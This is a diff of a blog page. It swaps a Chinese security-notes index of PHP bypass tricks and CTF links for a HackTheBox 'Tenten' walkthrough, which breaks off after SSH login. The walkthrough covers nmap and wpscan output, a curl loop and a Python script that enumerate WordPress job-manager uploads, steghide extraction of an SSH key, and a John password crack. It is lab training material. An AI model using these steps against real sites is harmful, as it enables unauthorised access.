@@ -11,7 +11,7 @@
 
     <title>
         
-          ca01hの笔记本 - ca01h&#39;s Blog
+          HTB::Tenten Walkthrough - ca01h&#39;s Blog
         
     </title>
 
@@ -291,210 +291,56 @@ function sidebar_toggle() {
           <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 <div class="book-post">
   
-  <figure class="highlight plain"><figcaption><span>wiki</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> _____       ___   _____   ___   _   _        _____   _       _____   _____  </span><br><span class="line">&#x2F;  ___|     &#x2F;   | &#x2F;  _  \ |_  | | | | |      |  _  \ | |     &#x2F;  _  \ &#x2F;  ___| </span><br><span class="line">| |        &#x2F; &#x2F;| | | | | |   | | | |_| |      | |_| | | |     | | | | | |     </span><br><span class="line">| |       &#x2F; &#x2F; | | | |&#x2F;| |   | | |  _  |      |  _  | | |     | | | | | |  _  </span><br><span class="line">| |___   &#x2F; &#x2F;  | | | |_| |   | | | | | |      | |_| | | |___  | |_| | | |_| | </span><br><span class="line">\_____| &#x2F;_&#x2F;   |_| \_____&#x2F;   |_| |_| |_|      |_____&#x2F; |_____| \_____&#x2F; \_____&#x2F; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+  <i class="fas fa-calendar-day"></i>&nbsp;2020-03-18&nbsp;
+  <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span><span> times</span>&nbsp;
+  <i class="fas fa-file-word"></i>&nbsp;<span class="post-count">1.6k</span>
+  
+  <h1 id="HTB-Tenten-Walkthrough">HTB::Tenten Walkthrough</h1>
+<h2 id="0x01-Information">0x01 Information</h2>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317230613.png" alt=""></p>
+<h2 id="0x02-Tools-and-Tis">0x02 Tools and Tis</h2>
+<ul>
+<li>nmap</li>
+<li>wpscan</li>
+<li>JohnTheRipper</li>
+<li>steghide</li>
+<li>wordpress job-manager plugin</li>
+</ul>
+<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
+<p>nmap扫描靶机端口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.10.10</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)</span><br><span class="line">|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)</span><br><span class="line">|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-generator: WordPress 4.7.3</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Job Portal &amp;#8211; Just another WordPress site</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.2 - 4.9 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 4.8 (92%), Linux 4.9 (91%), Linux 3.12 (90%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 80&#x2F;tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   237.00 ms 10.10.16.1</span><br><span class="line">2   309.00 ms 10.10.10.10</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 541.37 seconds</span><br></pre></td></tr></table></figure>
+<p>一看80端口运行wordpress站点，不多BB，直接上wpscan工具扫描：</p>
 <blockquote>
-<p><strong>ca01h@星盟安全</strong></p>
-<p>NTExOTY1NzM4QHFxLmNvbQ==</p>
+<p>wpscan使用教程：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/12236684.html">https://www.cnblogs.com/Xy--1/p/12236684.html</a></p>
 </blockquote>
-<p>互联网时代的知识是零散的，需要有一个写字的地方，把零散的知识汇聚起来，以点连线，以线聚面，一方面能形成一个完整的知识体系，另一方面自己所需之时方便查阅，于是乎就诞生了<strong>ca01hの笔记本</strong>。</p>
-<h2 id="TODO-LIST">TODO LIST</h2>
-<h3 id="2020">2020</h3>
-<p><strong>【未完成】SCTF复盘：<a target="_blank" rel="noopener" href="https://github.com/SycloverSecurity/SCTF2020/tree/master/Web">https://github.com/SycloverSecurity/SCTF2020/tree/master/Web</a></strong></p>
-<p><strong>【未完成】<a target="_blank" rel="noopener" href="https://bycsec.top/2020/08/05/Thinkphp-vuln/">Thinkphp-vuln</a></strong></p>
-<h4 id="September">September</h4>
-<ul>
-<li><strong>【未完成】实习+HW</strong></li>
-<li><strong>【未完成】DataCon复盘</strong></li>
-</ul>
-<h4 id="August">August</h4>
-<ul>
-<li><s><strong>【已完成】XCTF——WMCTF</strong>（有幸做了一个签到题</s></li>
-<li><s><strong>【已完成】DataCon2020 DNS恶意流量分析</strong>（有幸混了一个鼓励奖</s>
-<ul>
-<li>DNS恶意域名分析
-<ul>
-<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/y0Wv5ci30HIhXp5bbCZxRg">https://mp.weixin.qq.com/s/y0Wv5ci30HIhXp5bbCZxRg</a></li>
-</ul>
-</li>
-<li>加密恶意流量检测
-<ul>
-<li>初赛：<a target="_blank" rel="noopener" href="https://s1mple.online/2020/08/09/DataCon2020-%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%88%9D%E8%B5%9B-Writeup-%E5%8F%8A%E6%80%BB%E7%BB%93%E5%8F%8D%E6%80%9D/">https://s1mple.online/2020/08/09/DataCon2020-加密恶意流量检测初赛-Writeup-及总结反思/</a></li>
-</ul>
-</li>
-<li>僵尸网络分析
-<ul>
-<li>第一题：<a target="_blank" rel="noopener" href="https://www.cdxy.me/?p=829">https://www.cdxy.me/?p=829</a></li>
-<li>第三题：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/186948840">https://zhuanlan.zhihu.com/p/186948840</a></li>
-</ul>
-</li>
-<li>网络黑产分析</li>
-<li>恶意代码分析
-<ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/yuriufo/DataCon2020">https://github.com/yuriufo/DataCon2020</a></li>
-<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/187535672">https://zhuanlan.zhihu.com/p/187535672</a></li>
-<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/185715807">https://zhuanlan.zhihu.com/p/185715807</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><s><strong>【已完成】首届钓鱼城杯CTF</strong></s></li>
-<li><s><strong>【已完成】HW</strong></s></li>
-<li><s><strong>【已完成】<a target="_blank" rel="noopener" href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#htaccess">文件解析漏洞</a></strong></s></li>
-<li><strong>【未完成】《机器学习实战》前七章</strong></li>
-<li><s><strong>【已完成】BUUCTF刷题</strong></s></li>
-<li><strong>【未完成】HackTheBox OpenKeys（账号又被封了。。。</strong></li>
-<li><strong>【未完成】PHP构造反序列化链再学习</strong></li>
-</ul>
-<h4 id="July">July</h4>
-<ul>
-<li>
-<p><s><strong>【已完成】第五空间CTF复盘</strong></s></p>
-</li>
-<li>
-<p><s><strong>【已完成】DASCTF七月赛复盘</strong></s></p>
-</li>
-<li>
-<p><strong><s>【已完成】CSICTF2020复盘</s></strong></p>
-</li>
-<li>
-<p><s><strong>【已完成】2020电信天翼杯CTF</strong></s></p>
-</li>
-<li>
-<p><strong>【未完成】SUCTF2019 Upload2</strong></p>
-</li>
-<li>
-<p><strong>【未完成】N1CTF2018 Easy&amp;&amp;Hard PHP</strong></p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2148">https://xz.aliyun.com/t/2148</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/wonderkun/CTF_web/tree/master/web600-1?1520941487499">https://github.com/wonderkun/CTF_web/tree/master/web600-1?1520941487499</a></p>
-</li>
-<li>
-<p><strong>【未完成】<a target="_blank" rel="noopener" href="https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">Flask/Jinja2 SSTI &amp;&amp; Python 沙箱逃逸基础</a></strong></p>
-</li>
-<li>
-<p>【<strong>未完成】<a target="_blank" rel="noopener" href="https://www.smi1e.top/%E5%B0%8F%E5%AF%86%E5%9C%88%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%87%A0%E7%A7%8D%E5%8F%98%E5%BD%A2%E5%AD%A6%E4%B9%A0/">PHP写配置漏洞</a></strong></p>
-</li>
-<li>
-<p><strong>【未完成】<a target="_blank" rel="noopener" href="https://www.smi1e.top/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8/">PHP弱类型比较</a></strong></p>
-</li>
-<li>
-<p><strong>【未完成】<a target="_blank" rel="noopener" href="https://zeroyu.xyz/2020/06/04/Code-breaking-Puzzles-2018-Note">Code Breaking 2018挑战赛学习——正则回溯</a></strong></p>
-</li>
-<li>
-<p><s><strong>【已完成】HackTheBox Tabby</strong></s></p>
-</li>
-<li>
-<p><s><strong>【已完成】HackTheBox Sneakymailer</strong></s></p>
-</li>
-<li>
-<p><strong>【未完成】Flask Pin码安全</strong></p>
-</li>
-</ul>
-<h4 id="June">June</h4>
-<ul>
-<li>
-<p><s>【已完成】<strong>RCTF2020</strong></s>（被完虐。。😭纯粹靠着队里的pwn师傅抬着走)</p>
-</li>
-<li>
-<p><s>【已完成】<strong>PHP反序列化——Phar</strong></s></p>
-</li>
-<li>
-<p><s>【已完成】<strong>PHP反序列化——Session</strong></s></p>
-</li>
-<li>
-<p>【未完成】<strong>新春战役 Hackme</strong>：<a target="_blank" rel="noopener" href="https://www.mrkaixin.top/posts/df9f633e/#5-0-hackme">https://www.mrkaixin.top/posts/df9f633e/#5-0-hackme</a></p>
-<ul>
-<li><strong>filter_var绕过</strong>：<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/67064.html">https://www.secpulse.com/archives/67064.html</a></li>
-<li><strong>绕过四个字符限制getshell</strong>：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/87203">https://www.anquanke.com/post/id/87203</a></li>
-</ul>
-</li>
-<li>
-<p><s>【已完成】<strong>PHP反序列化——Soapclient</strong></s></p>
-<ul>
-<li><strong>LCTF bestphp’s revenge</strong></li>
-</ul>
-</li>
-<li>
-<p><s>【未完成】<strong>PHP反序列化——字符逃逸</strong></s></p>
-</li>
-<li>
-<p>【未完成】<a target="_blank" rel="noopener" href="https://yanmymickey.github.io/2020/04/14/CTF/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"><strong>PHP反序列化——Bypass</strong></a></p>
-</li>
-<li>
-<p><s>【未完成】<strong>代码审计学习——PHP-Audit-Code Day1-6</strong></s></p>
-</li>
-<li>
-<p>【未完成】<a target="_blank" rel="noopener" href="https://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/#GOPHER"><strong>phpinfo中的关键信息</strong></a></p>
-</li>
-<li>
-<p>【未完成】<strong>Redis安全学习</strong></p>
-</li>
-<li>
-<p><s>【已完成】<strong>BUUCTF刷题</strong></s></p>
-</li>
-<li>
-<p><s>【已完成】<strong>XMCTF解题</strong></s></p>
-</li>
-<li>
-<p><s>【已完成】<strong>第五空间CTF比赛（2020.06.24）</strong>（菜就一个字。。。）</s></p>
-</li>
-<li>
-<p><s>【已完成】<strong>队内AWD训练赛（2020.06.28）</strong></s></p>
-</li>
-</ul>
-<h2 id="Awesome-Articals-Projects">Awesome Articals/Projects</h2>
-<h3 id="Bypass-Tricks">Bypass &amp; Tricks</h3>
-<h4 id="PHP">PHP</h4>
-<h5 id="preg-match绕过">preg_match绕过</h5>
-<blockquote>
-<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/12198258.html">https://www.cnblogs.com/20175211lyz/p/12198258.html</a></p>
-</blockquote>
-<ul>
-<li>数组绕过</li>
-<li>PCRE回溯限制（code-breaking2018）</li>
-<li>换行符</li>
-</ul>
-<h5 id="PHP字符串解析特性绕过">PHP字符串解析特性绕过</h5>
-<blockquote>
-<p>参考文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>
-</blockquote>
-<p>借用一张图简单地记一下</p>
-<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708203746.png" alt=""></p>
-<h5 id="SSRF-file协议绕过">SSRF file协议绕过</h5>
-<p>如果SSRF中<code>file://</code>关键字被禁用，可以使用<code>file:/</code>或者<code>file:///</code>来代替。</p>
-<p>例题：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BGKCTF2020%5DEZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb">[GKCTF2020]EZ三剑客-EzWeb</a></p>
-<h5 id="Session绕过">Session绕过</h5>
-<p>删除cookie，没有cookie中的SESSIONID就找不到对应的session文件，相应的<code>$_SESSION['var']</code>就为NULL，相当于传参NULL。</p>
-<p>例题：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BBJDCTF%202nd%5D%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B">BJDCTF2nd 文件探测</a></p>
-<h5 id="利用数组绕过">利用数组绕过</h5>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">sha1(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">ereg(pattern,<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">preg_match(pattern,<span class="keyword">Array</span>()) = <span class="literal">false</span></span><br><span class="line">strcmp(<span class="keyword">Array</span>(), <span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strpos(<span class="keyword">Array</span>(),<span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strlen(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br></pre></td></tr></table></figure>
-<p>例题：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5B0CTF%202016%5Dpiapiapia">0CTF2016 piapiapia</a></p>
-<h5 id="basename绕过">basename绕过</h5>
-<p>从 <a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=62119">https://bugs.php.net/bug.php?id=62119</a> 找到了<code>basename()</code>函数的一个问题，它会去掉文件名开头的非ASCII值：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(basename(<span class="string">&quot;xffconfig.php&quot;</span>)); <span class="comment">// =&gt; config.php</span></span><br><span class="line">var_dump(basename(<span class="string">&quot;config.php/xff&quot;</span>)); <span class="comment">// =&gt; config.php</span></span><br></pre></td></tr></table></figure>
-<p>例题：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BZer0pts2020%5DCan%20you%20guess%20it?">[Zer0pts2020]Can you guess it?</a></p>
-<h5 id="htaccess利用">.htaccess利用</h5>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks%E6%80%BB%E7%BB%93">https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks总结</a></p>
-<h3 id="Linux入侵检测">Linux入侵检测</h3>
-<p><a target="_blank" rel="noopener" href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p>
-<h3 id="红蓝对抗">红蓝对抗</h3>
-<p><a target="_blank" rel="noopener" href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/hudunkey/Red-Team-links">https://github.com/hudunkey/Red-Team-links</a></p>
-<h3 id="代码审计">代码审计</h3>
-<p><a target="_blank" rel="noopener" href="https://github.com/CHYbeta/Code-Audit-Challenges">https://github.com/CHYbeta/Code-Audit-Challenges</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/hongriSec/PHP-Audit-Labs">https://github.com/hongriSec/PHP-Audit-Labs</a></p>
-<h3 id="WAF">WAF</h3>
-<p><a target="_blank" rel="noopener" href="https://wh0ale.github.io/2019/12/04/waf%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0Bypass/">https://wh0ale.github.io/2019/12/04/waf从入门到Bypass/</a></p>
-<p><a target="_blank" rel="noopener" href="https://weibo.com/ttarticle/p/show?id=2309404007261092631700#_loginLayer_1579837230756">https://weibo.com/ttarticle/p/show?id=2309404007261092631700#_loginLayer_1579837230756</a></p>
-<h3 id="java安全">java安全</h3>
-<p><a target="_blank" rel="noopener" href="https://github.com/threedr3am/learnjavabug">https://github.com/threedr3am/learnjavabug</a></p>
-<h3 id="Python安全">Python安全</h3>
-<p><a target="_blank" rel="noopener" href="https://github.com/bit4woo/python_sec">https://github.com/bit4woo/python_sec</a></p>
-<h3 id="字典">字典</h3>
-<p><a target="_blank" rel="noopener" href="https://github.com/insightglacier/Dictionary-Of-Pentesting">https://github.com/insightglacier/Dictionary-Of-Pentesting</a></p>
-<h3 id="求职">求职</h3>
-<p><a target="_blank" rel="noopener" href="https://github.com/geekcompany/ResumeSample">https://github.com/geekcompany/ResumeSample</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/zhaoweiho/web-sec-interview">https://github.com/zhaoweiho/web-sec-interview</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/EvilAnne/Pentest_questions">https://github.com/EvilAnne/Pentest_questions</a></p>
+<p>看到这个版本有很多XSS漏洞利用，但是打这个靶机XSS漏洞一般都是没什么作用，接着往下看，发现站点安装了一个<code>job-manager</code>的插件。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200318195036.png" alt=""></p>
+<p>点击进入申请职位的页面，发现有一个文件上传的地方，先上传一个正常图片，再到<code>http://10.10.10.10/wp-content/%year%/%month%/%filename%</code>查看发现可以正常显示。再尝试用BurpSuite改一下文件内容：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200318205438.png" alt=""></p>
+<p>服务端检测了后缀名，目前已知只能上传jpg，png等图片类型。</p>
+<p><a target="_blank" rel="noopener" href="https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/">https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/</a></p>
+<p>这篇文章提到了一种类似平行越权的手法：<code>http://10.10.10.10/index.php/jobs/apply/8/</code>，这里8类似招聘文章的id，我们可以使用BurpSuite遍历它：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200318203806.png" alt=""></p>
+<p>另外，这里扩展一种思路，可以直接写bash脚本跑出来，这种结果更为直观：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(seq 1 20); <span class="keyword">do</span> <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$i</span>: &quot;</span>; curl -s http://10.10.10.10/index.php/<span class="built_in">jobs</span>/apply/<span class="variable">$i</span> | grep <span class="string">&#x27;&lt;title&gt;&#x27;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200318211616.png" alt=""></p>
+<p>id=13的这篇文章标题是<code>HackerAccessGranted</code>，比较可疑，另外id=17的文章标题是我刚刚上传的图片的文件名。这两点结合起来，我们怀疑<code>HackerAccessGranted</code>是不是也是用户上传的一张图片的文件名。但是要访问到这张图片，我们必须知道上传的年份和月份，想到这里，那就写一个Python脚本跑一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">website = <span class="string">&#x27;http://10.10.10.10/wp-content/uploads/&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;HackerAccessGranted&#x27;</span></span><br><span class="line">exts = [<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> year <span class="keyword">in</span> range(<span class="number">2016</span>, <span class="number">2018</span>):</span><br><span class="line">    <span class="keyword">for</span> month <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">13</span>):</span><br><span class="line">        <span class="keyword">for</span> ext <span class="keyword">in</span> exts:</span><br><span class="line">            url = website + str(year) + <span class="string">&#x27;/&#x27;</span> + <span class="string">&quot;&#123;:02&#125;&quot;</span>.format(month) + <span class="string">&#x27;/&#x27;</span> + filename + <span class="string">&#x27;.&#x27;</span> + ext</span><br><span class="line">            req = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> req.status_code == <span class="number">404</span>:</span><br><span class="line">                url = website</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">&#x27;[+] URL Found: &#x27;</span> + url)</span><br></pre></td></tr></table></figure>
+<p>得到结果<code>http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg</code></p>
+<p>把图片用binwalk检查一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk HackerAccessGranted.jpg </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br></pre></td></tr></table></figure>
+<p>再用隐写工具steghide提取一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ steghide extract -sf HackerAccessGranted.jpg </span><br><span class="line">Enter passphrase: </span><br><span class="line">wrote extracted data to &quot;id_rsa&quot;.</span><br></pre></td></tr></table></figure>
+<p>OK，提取出了<code>id_rsa</code>文件，再用John一把梭</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ python &#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa &gt; id_rsa.hash </span><br><span class="line">$ &#x2F;sbin&#x2F;john id_rsa.hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (SSH [RSA&#x2F;DSA&#x2F;EC&#x2F;OPENSSH (SSH private keys) 32&#x2F;64])</span><br><span class="line">Cost 1 (KDF&#x2F;cipher [0&#x3D;MD5&#x2F;AES 1&#x3D;MD5&#x2F;3DES 2&#x3D;Bcrypt&#x2F;AES]) is 0 for all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 1 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Note: This format may emit false positives, so it will keep trying even after</span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">superpassword    (id_rsa)</span><br><span class="line">Warning: Only 2 candidates left, minimum 4 needed for performance.</span><br><span class="line">1g 0:00:00:08 DONE (2020-03-18 10:52) 0.1173g&#x2F;s 1683Kp&#x2F;s 1683Kc&#x2F;s 1683KC&#x2F;sa6_123..*7¡Vamos!</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
+<p>好了，得到了密码，但是现在好像还没有用户名orz…，再用wpscan枚举站点的用户名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] takis</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;10.10.10.10&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
+<p>再用ssh登录靶机，获取<code>user.txt</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i id_rsa takis@10.10.10.10</span><br><span class="line">Enter passphrase for key &#39;id_rsa&#39;: </span><br><span class="line">Welcome to Ubuntu 16.04.2 LTS (GNU&#x2F;Linux 4.4.0-62-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line"> * Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line"> * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line"></span><br><span class="line">65 packages can be updated.</span><br><span class="line">39 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Fri May  5 23:05:36 2017</span><br><span class="line">takis@tenten:~$ whoami</span><br><span class="line">takis</span><br><span class="line">takis@tenten:~$ ls -la &#x2F;home&#x2F;takis</span><br><span class="line">total 48</span><br><span class="line">drwx------ 5 takis takis 4096 Apr 12  2017 .</span><br><span class="line">drwxr-xr-x 5 root  root  4096 Apr 12  2017 ..</span><br><span class="line">-rw------- 1 root  root     1 Dec 24  2017 .bash_history</span><br><span class="line">-rw-r--r-- 1 takis takis  220 Apr 12  2017 .bash_logout</span><br><span class="line">-rw-r--r-- 1 takis takis 